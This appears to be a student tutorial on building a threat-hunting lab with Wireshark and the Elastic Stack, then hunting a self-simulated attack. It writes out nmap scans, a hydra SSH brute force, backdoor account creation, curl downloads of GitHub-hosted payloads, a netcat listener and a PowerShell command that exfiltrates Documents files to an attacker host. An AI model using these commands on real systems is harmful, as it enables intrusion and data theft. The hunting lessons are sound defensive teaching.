# **Introduction**

Cyber threats are evolving rapidly, and organizations can no longer rely solely on preventive or reactive security measures. This is where **Threat hunting** comes in **Threat Hunting** is a proactive approach where analysts actively search for hidden adversaries in a network, leveraging both hypothesis-driven investigation and data driven investigation. Unlike traditional detection methods like **Incident response** that depend on trigger of  alerts and  signatures, threat hunting emphasizes pattern recognition, anomaly detection, and mapping to adversary techniques to detect threat before the trigger.

In this project we will design and implement a **threat hunting lab** which will contain **wireshark** for packet level analysis and detection of  Iocs and **Elastic Stack** for packet level analysis to identify iocs and to make it as realistic as possible we will  simulate our own attack that follows **MITRE ATT&CK** and cyberkillchain framework to generate or own traffic so that we can analyze packet captures, extract Iocs, and correlate them with MITRE ATT&CK tactics and techniques.

And my objective for writing this documentation is to teach other what i learned while interning for insa so it might not be industry standard but i hope it sufficient for getting started into threat hunting and about
 1. understand the threat hunting process end to end
 2. identify iocs from simulated attacks using Wireshark and elk
 3. map our finding to mitreattack
 as you can see this project is not only about threat hunting its well rounded and touches many SOC fields so you can think it as holistic view of proactive security operation. 

Before we start setting our lab and configuration we have to first talk about the tool we will use and why we used it .


# Tools & Technology

## WireShark

**WireShark** is the most popular network protocol analyzer and packet level analysis tool, it is widely used by it professional because it a powerful,free and opensource tool that enable comprehensive troubleshooting  and network monitoring with powerful features like filtering, scripting, and exporting capabilities, along with a graphical user interface (GUI) and a command-line interface . which makes it perfect for threat hunting.

## Elastic stack

Elastic stack is a set of open source tools like elastic search , kibana, logstash and beats work together to enable us to search , analyze and visualize data. i choose this tool in addition to Wireshark because it takes data from any form and in any format unlike Wireshark. but there are many other tools like splunk  which is commercial so i opted to using elk  which is opensource.

## MITRE ATT&CK

MITRE ATT&CK is a frame work that is used to map adversary action.in short it is a frame work a global knowledge of common adversary behavior  The ATT&CK stands for Adversary Tactic, Technique and common knowledge. we use this because it provides a structured, common language for security teams to map adversary actions across the entire attack life cycle.

now we have seen what tools we are going to use let setup out lab.

Now that we have seen what the tools and Technology do let get straight to sting it up. 

# 3.1 Environment Architecture

In this project we have to have at least two computers or virtual machine using virtual machine is recommended, one is the victim machine and the other is the monitoring machine but if you can i recommend using third machine we will name attacker machine.

here is my setup i choose to set it up in two different computers to maximize the resource but you might not need to set it up in two computer you can just do it using virtual box but if you have 8 Gb ram  or below i recommend using this step.

| Device     | OS              | Host Name       | Description                                                                              |
| ---------- | --------------- | --------------- | ---------------------------------------------------------------------------------------- |
| Victim     | Windows 10 Vbox | DESKTOP-TRACPJE | this is the machine that will generate  the malware infected traffic                     |
| Monitoring | Kali Linux      | kali            | this is the machine that receive the traffic from the victim machine and try to find IOC |


![[Pasted image 20250826081018.png]]

# **Lab Setup and Configuration**
## 3.1.1 Setting up Monitoring Machine

Let start with the monitoring machine this machine is kali linux os and  just like we said we this machine will host Wireshark and elastic stack so let get to it. 

### A. setup Wireshark

First let check if we have Wireshark to begin with so open your terminal and  type this  command to check.

```bash
wireshark --version
```

if you see output that start with this great that means you already have Wireshark.

```
Wireshark 4.4.7.

Copyright 1998-2025 Gerald Combs <gerald@wireshark.org> and contributors.
Licensed under the terms of the GNU General Public License (version 2 or later).
This is free software; see the file named COPYING in the distribution. There is
NO WARRANTY; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

if not just type this command to install it.
 ```shell
 sudo apt install wireshark
 ```

Now open when you open  Wireshark you should see something like this 

![[Pasted image 20250826083644.png]]

To set up wireshark first we should create profile so that we can customize  so press **Ctrl + Shift + A** this will lead you to profile configuration you should see something like this.

![[Pasted image 20250826084435.png]]

Now just press the **"+"** button in left corner and create your profile then enter ok this will create you profile and log you in as the profile you have created. after you created a profile
you should choose an interface you are currntly using if it wifi choose WLAN0  if not choose eth0 this will start collecting traffic but we are not gonna bother about that right know we will see it in threat hunting portion so let just ignore that and set up some basic filter we will need. to setup filter press the + button in the right top corner.
![[Pasted image 20250826085210.png]]

this will prompt you to enter lable and filter so just enter the following 

| lable       | filter                                                                                                      |
| ----------- | ----------------------------------------------------------------------------------------------------------- |
| Basic       | (http.request or tls.handshake.type eq 1) and !(ssdp)                                                       |
| Basic+      | (http.request or tls.handshake.type eq 1 or (tcp.flags.ack eq 0 and tcp.flags.syn eq 1)) and !(ssdp)        |
| Basic + Dns | (http.request or tls.handshake.type eq 1 or (tcp.flags.ack eq 0 and tcp.flags.syn eq 1) or dns) and !(ssdp) |
| Email Basic | smtp or pop or imap                                                                                         |
This will be some of the basic filters we will going to use in threat hunting section.now we have setup the filter we have finished setting up Wireshark .

### B Setup Elastic Stack

Before setting up elk we first have to know what each tool do so let see that first:
	**logstash** is used to ingest logs so think of it as a data pipeline
	**ElasticSearch** is used to store and index data so think of it as database + search engine 
	**Kibana** is visualization and dashboard tool

```mermaid
graph LR
   A[Logstash] --> B[Elastic Search] --> C[kibana]
```
      #### How They Work Together

		1. Logstash ingests logs from systems/tools.
		2. It cleans, enriches, and forwards them to Elasticsearch
		3. Elasticsearch stores and indexes them for fast search. 
		4. Kibana provides dashboards & visualizations for analysts

#### 1.Setting up Elastic Search

First let download elastic search from the internet we have to choice of
download the first one is to use apt and the second is to get from the
website. let downloaded if from website.
open the terminal and use this command to download it
```shell
curl -OL https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-9.1.2-linux-x86_64.tar.gz
```
 
 wait till it finshed and go to the directory you downloaded the file in you will see a 
 elasticsearch tar file so type this command to extract file from the tar file
 
```shell
tar xzf elasticsearch-9.1.2-linux-x86_64.tar.gz
```

Then open the extracted file in terminal and go to the config then enter this command

```shell
vim elasticsearch.yml
#then add the following
network.host: 0.0.0.0 #so that it accept all ipv4
discovery.type: single-node
```

save the file then now that  we configured it let start the elastic search using this command

```shell
cd ../bin
./elasticsearch
```

wait about 3-4 minute let it start then let check it's working

```shell
curl localhost:9200 #to check if elastic search is working
```

after running the above command you should see the version of the elastic search or some thing like this and this mean elastic search is running 

```
{
  "name" : "kali",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "R9hgACEbSJ-7tkEpkIpnDA",
  "version" : {
    "number" : "9.1.2",
    "build_flavor" : "default",
    "build_type" : "tar",
    "build_hash" : "ca1a70216fbdefbef3c65b1dff04903ea5964ef5",
    "build_date" : "2025-08-11T15:04:41.449624592Z",
    "build_snapshot" : false,
    "lucene_version" : "10.2.2",
    "minimum_wire_compatibility_version" : "8.19.0",
    "minimum_index_compatibility_version" : "8.0.0"
  },
  "tagline" : "You Know, for Search"
}
```

#### 2.Setting up kibana

Like we did in elastic search we go to the website of elasticsearch then copy the download link 

```
curl -OL "https://artifacts.elastic.co/downloads/kibana/kibana-9.1.2-linux-x86_64.tar.gz"
```

then extract it using 

```
tar xzf kibana-9.1.2-linux-x86_64.tar.gz
```

after that let configure the setting to suit our need 

```
vim kibana-9.1.2-linux-x86_64/config/kibana.yml
```

then add the following lines

```
server.host:"0.0.0.0"
elasticsearch.hosts:["http://localhost:9200"]
```

now that we configure it let check if it working but before that make sure elastic search is running smoothly then only then should you run 

```shell
./kibana-9.1.2-linux-x86_64/bin/kibana
```

 wait a few minute for it to begin then go your browser and search **localhost:5601**, if kibana and elastic search run correctly you should enter kibana home page or should see this in your browser.

![[Pasted image 20250826095917.png]]

#### 3. Setting up logstash

Download logstash using this

```shell
curl -OL "https://artifacts.elastic.co/downloads/logstash/logstash-9.1.2-linux-x86_64.tar.gz"
```

then just like before extract it using

```shell
tar xzf logstash-9.1.2-linux-x86_64.tar.gz
```

We have finished setting up both Wireshark and elk let continue setting up our next machine which is the victim machine.

## 3.1.2 setting up victim machine

**Prerequisites** : Before we start you have to have a virtual machine with windows 10 installed it. it has to be virtual machine because we will try to simulate an attack which might affect our system so we have to take precaution against that by using virtual machine.

So in this section we will setup the victim machine  so that it will send logs to our monitoring machine. Let get started:

#### Downloading Tools

Lets download all tools that we need in one go so that we can focus on configuration
Tools we are going to download are 
	1. **Winlogbeat** : tool we are going to use to collect and forward windows event logs.  [Download Winlogbeat](https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-9.1.2-windows-x86_64.zip) 
	2. **Packetbeat** : tool we are going to use to collect network traffic of the windows 10.[Download Packetbeat](https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-9.1.2-windows-x86_64.zip)
	3. **npcap**: tool that provide necessary drivers and API to capture raw network packet.[Download npcap installer](https://npcap.com/dist/npcap-1.83.exe)
	4. **Sysmon**:tool to log detailed system activity, such as process creation, network connections, and file changes, to the Windows event log [Download Sysmon](https://download.sysinternals.com/files/Sysmon.zip)

#### Configuring Tools 

##### 1. Winlogbeat

Go to where you have downloaded the Winlogbeat file then extract it in **c : \program files** . from now on we going to use cmd so open cmd in administrator to open it press WIN + R then type cmd and press SHIFT + ENTER. this should open up cmd after that we will go to Winlogbeat directory using this command
```cmd
cd c:\ Program File\Winlogbeat....
```
after we opened the Winlogbeat directory there is a file with the name of Winlogbeat.yml open that file using
```cmd
notepad.exe winlogbeat.yml
```
after opening it modify file like this 
```
setup kibana:
	host: "[your monitoring machine ip]:5601" #for example host:"190.2.3.4:5601"
output.elasticsearch:
	hosts: ["[your monitoring machine ip ]:9200"]
	 # for example host:["190.2.3.4:9200"]
winlogbeat.event_logs:
  # Sysmon (all events)
  - name: Microsoft-Windows-Sysmon/Operational

  # Security log (logons, process creation, object access, etc.)
  - name: Security

  # PowerShell logs (script execution)
  - name: Microsoft-Windows-PowerShell/Operational
  - name: Windows PowerShell

```
save and close it. now let check if we configured it correctly using 
```cmd
winlogbeat.exe test config 
```
we should see OK for correct configuration then we will test the out put using this but before testing it start both Kibana and Elasticsearch.
```cmd
winlogbeat.exe test output
```
you should see OK in the output  that mean we successfully configured Winlogbeat correctly so we will now setup Winlogbeat. Make sure kibana is running before starting the setup. to start the setup enter this command.
```cmd
winlogbeat.exe setup
```
finally  we are going to install Winlogbeat as a service 
```cmd
PowerShell.exe -ExecutuionPolicy UnRestricted -File .\install-service-winlogbeat.ps1
```
we have installed as a service but it not started so we have to start it , to start Winlogbeat service go to services then start Winlogbeat.
##### 2. npcap 
In case of npcap just run the setup as an administrator and install it.
##### 3. Packetbeat
just like npcap run the Packetbeat setup as administrator and install Packetbeat this will install Packetbeat  file in c:\Program Files . then like we did in Winlogbeat we will open cmd and go to Packet beat directory to configure the setting of Packetbeat.

Next we have identify which device we want the Packetbeat to collect in this case we want to collect in interface that we are connected to internet in order to know which interface is that we will use this command
```cmd
packetbeat.exe devices
```
then choose the number of the device that have ip address in most cases it will be device 3.Now we know which interface we want let get straight to configuring so just like Winlogbeat we will open the **Packetbeat.yml**  and enter this values.
```
Packetbeat.interface.device: 3 #the device you want packetbeat to collect
setup kibana:
	host: "[your monitoring machine ip]:5601" #for example host:"190.2.3.4:5601"
output.elasticsearch:
	hosts: ["[your monitoring machine ip ]:9200"]
	 # for example host:["190.2.3.4:9200"]
```
and just like before we will check both the config and output of Packetbeat is OK using
```cmd
packetbeat.exe test config 
packetbeat.exe test output
```
and run the setup using 
```cmd
packetbeat.exe setup
```
after installing the setup just like before we will install Packetbeat as a service and start the service.
```cmd
PowerShell.exe -ExecutuionPolicy UnRestricted -File .\install-service-packetbeat.ps1
```
then go to services and start the Packetbeat to run the service.then we will go to the motoring machine and open kibana to check if the Packetbeat and Winlogbeat are correctly passing logs into kibana. we should many incoming logs like this.
![[Pasted image 20250828042217.png]]
now our elk is setup and receive logs from the victim machine let simulate an attack for generating malware logs so we can threat hunt it. 

# **Attack Simulation**

In this section we will try to simulate an attack so that we will threat hunt it later section and we will use cyber kill chain and MITRE ATT&CK .

we will use  Active Scanning(T1595) to gather intel of on the victim. so we will scan all hosts that are up in our network using this command.
```shell
nmap -sn -T 5 192.168.1.0-255
```
![[Pasted image 20250901182900.png]]
after we scanned the network as indicated we will see out victim machine is up so we will continue scanning our victim machine.
```bash
sudo nmap -sS -A -T 5 192.168.1.2
```
![[Pasted image 20250901182959.png]]

now we can see all the open ports like 22,135,139,445 which are vectors we can use to attack the victim but for now let select port 22 or ssh to brute force  attack it.to brute force ssh we will create word-list or use existing one like rockyou then use hydra tool which will give us the password and username.
to create word-list we will use
```shell
crunch 5 5 12345 -o wordlist.txt
```
and use hydra like this
```shell
hydra -l username -P Wordlist victimIP
```

![[Pasted image 20250901183111.png]]
now we know the user name and password let log in using ssh
```shell
ssh econt@192.168.1.2
```
enter the password and this will give us access to victim computer. let try to figure out our environment using commands like whoami, hostname etc
![[Pasted image 20250901183308.png]]
now we gain understanding of our surrounding let download our payload from GitHub to directory Temp .
![[Pasted image 20250901184356.png]]
Before we execute our payload let setup some backdoor like create our own user in victim machine.
![[Pasted image 20250901185236.png]]
as you can see we have created our own user.
![[Pasted image 20250901185303.png]]
know we created a backdoor let execute our payload but first let run a net cat listing port so we can establish reverse shell
![[Pasted image 20250901185654.png]]
after we started net cat let execute the payload
![[Pasted image 20250901191417.png]]
executing the payload does two things
1. it will add payload in registry so that we can connect anytime we want and
2. it will connect the attacker machine to power shell of the victim machine
after that let do action on objective which is we want to extract all file that are in victim machine document. we can do that using
```
nc -lvnp 4444 > exfil.zip #in attacker machine
```

```
Compress-Archive -Path C:\Users\econt\Documents\* -DestinationPath C:\temp\exfil.zip; 
$bytes = [System.IO.File]::ReadAllBytes('C:\temp\exfil.zip'); 
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8', 4444); 
$stream = $client.GetStream(); 
$stream.Write($bytes, 0, $bytes.Length); 
$client.Close()

```

![[Pasted image 20250901193213.png]]
As we can see in the image we successfully exfiltrate data(password.txt and secret.txt) from the victim machine know we successfully simulated an attack let go to threat hunting it.

# **Threat Hunting**

There are two type of threat hunting that we have to concern about one is intelligence driven which uses external intelligence like cli to threat hunt you can think of it as like you are a  detective who have evidence about recent attacks(ioc and cli) and now you are looking  for it in your house if there are any hiding in your place. The second type is data driven which uses internal intelligence to look for threat like above you are detective but you don't have any evidence from another case you just looking any abnormal behavior in your house. in this project we will use data driven threat hunting so we will look for any abnormal behavior in our traffic and logs so let get to it.

To look for any abnormal behavior the one of the best place to  start is network  traffic so let look abnormal behavior  and analyze  it using Wireshark tool.
![[Pasted image 20250904080439.png]]
we can see in the image that we have **14398** packets which too many for us to analyze so let filter using basic filter to make it easier for us .
![[Pasted image 20250904083337.png]]
in the in image we can see many client hello from 192.168.1.8 so let look more into it using basic + filter.
![[Pasted image 20250904083702.png]]
as we can see there is many tcp syn request from 192.168.1.8 in different port so we can deduct that the attacker is using nmap or any tool to find vulnerable(open) port so let see if have found any by using this filter.
```
tcp.flags.reset == 1 and tcp.flags.ack==1 and ip.src == 192.168.1.8
```
![[Pasted image 20250904085101.png]]
based on the image we can imagine that there are open port in 22,445,135,3389,139 but not the other bc the source port are constant 3000 and 4444 so there is funny business going on here other than port scanning.
as far as now we collected many ioc we can thread to find more lets list them
1. ip address - 192.168.1.8
2. ports - 22,445,135,3389,139,3000 and 4444

let focus at port 22  and see if there is any traffic generated from 192.168.1.8 using this
```
port == 22 and ip.addr == 192.168.1.8
```
![[Pasted image 20250904090826.png]]
A flood of SYN packets from **192.168.1.8 → 192.168.1.5:22** almost every SYN is answered by RST, ACK from the server some rare  SYN → SYN/ACK → RST handshakes complete but then get dropped.so we can deduce that 192.168.1.8 is trying to enter using ssh brute for and now we will see if they succeeded
![[Pasted image 20250904091803.png]]
the ssh request was ack so the attacker had succeed so let double check using elk.
![[Pasted image 20250904095140.png]]
from the image we can see there are many ssh traffic from **192.168.1.8** and we can see it started at  **Sep 3, 2025 @ 15:30:02.24**
now let see if and when ssh login is success using winlogbeat and 
```
winlog.event_id: 4625 # login failed 
winlog.event_id: 4624 # login success
winlog.logon.id: 3 network connection
winlog.logon.id: clear network connection
```
using this filter we will see 
```
winlog.event_id : ("4624" or "4625") and winlog.logon.id: 3 or 8 and process.name: ("sshd.exe" or "ssh-keygen.exe" or "ssh.exe")
```
![[Pasted image 20250904110927.png]]
in the image we will see that there are two user name econt and fake user and both of them have large number of login failed which implies that the attacker is trying to brute force attack on ssh and also we can see that there is 4 successful login in econt which implies that the attacker gain access to econt using ssh so let look what he has done using this user name before that let list all of iocs.

| IOC        | values      |
| ---------- | ----------- |
| username   | econt       |
| Ip Address | 192.168.1.8 |
| Port       | 22(SSH)     |
now let go to discover and see what attacker did after he logon to econt using
```
winlog.event_id: 1
```
because when we login to ssh we initiate cmd or power-shell which we can see using event id 1 which is process.creation.
![[Pasted image 20250904115734.png]]
we filter out legitimate process like svchost.exe,taskhostw.exe
![[Pasted image 20250904123439.png]]
in the image we can see that the attacker entered the system using  econt username and done lateral movement like whoami , net users and hostname.
![[Pasted image 20250904123806.png]]
and proceed to delete username ayele and create it own ayele username 
![[Pasted image 20250904123941.png]]
then continue to make ayele an administrator
![[Pasted image 20250904124239.png]]
and proced to download file from github with url 
1. curl -OL https://raw.githubusercontent.com/econx1/payload/refs/heads/main/word.txt.ps1
2. curl -OL https://raw.githubusercontent.com/econx1/payload/refs/heads/main/payload.bat
let see what github find more ioc.
![[Pasted image 20250904124904.png]]
as we can see there  are many payloads in this github but let look the one that attacker downloaded word.txt.ps1 and payload.bat
![[Pasted image 20250904125046.png]]
the payload.bat is used to trigger the word.txt.ps1.
![[Pasted image 20250904125217.png]]
the word.txt.ps1 is payload that will create reverse shell on port 3000 and it also create register so it will run persistently.now we know what the payload contained let see where and what it has downloaded
![[Pasted image 20250904130414.png]]
we can see that both payload files are downloaded in C:\Users\econt\AppData\Local\Temp\ directory.

![[Pasted image 20250904134858.png]]
we can see that the attacker just run word.txt.ps1  and is looping until in getting connected to 192.168.2.8:3000.and let go to Packetbeat  to see if they are connected
![[Pasted image 20250904135553.png]]
and as we can see attacker successfully connected using reverse shell.after following along we wil see
![[Pasted image 20250904171134.png]]
 a attacker entered a command 
 ```
 Compress-Archive -Update -Path C:\Users\econt\Documents\* -DestinationPath C:\temp\exfil.zip; $bytes = [System.IO.File]::ReadAllBytes('C:\temp\exfil.zip'); $client = New-Object System.Net.Sockets.TCPClient('192.168.1.8', 4444); $stream = $client.GetStream(); $stream.Write($bytes, 0, $bytes.Length); $client.Close();
 ```
 which will exfiltrate data from Documents to 192.168.1.8 using port 4444. and we see that it trying to exfiltrate all documents in document file let see if the attacker tried to exfiltrate other files.![[Pasted image 20250904171538.png]]
 after some time digging  we will see the attacker trying to exfiltrate file secret.txt , password.txt and last_log.pcap. rough diagram will look like this.

![[layer1(1).svg]]




This is the end of our project and i hope that i at least i  gave you some basic understanding and fascination about  threat hunting BYE ;>

# Done by Natnael Tesfu